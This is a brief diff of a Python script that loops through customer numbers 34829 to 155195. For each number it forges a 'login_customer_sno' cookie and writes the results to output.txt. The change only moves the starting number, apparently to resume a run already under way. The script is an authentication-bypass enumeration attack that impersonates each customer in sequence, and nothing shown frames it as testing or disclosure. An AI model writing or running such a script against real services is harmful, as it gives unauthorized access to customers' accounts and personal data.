@@ -27,7 +27,7 @@ headers = {
 
 # Iterate over the customer numbers
 with open("output.txt", "w", encoding="utf-8") as output_file:
-    for sno in range(33920, 155195):
+    for sno in range(34829, 155195):
         # Update the Cookie with the current customer number
         headers["Cookie"] = f"login_customer_sno={sno};"
 
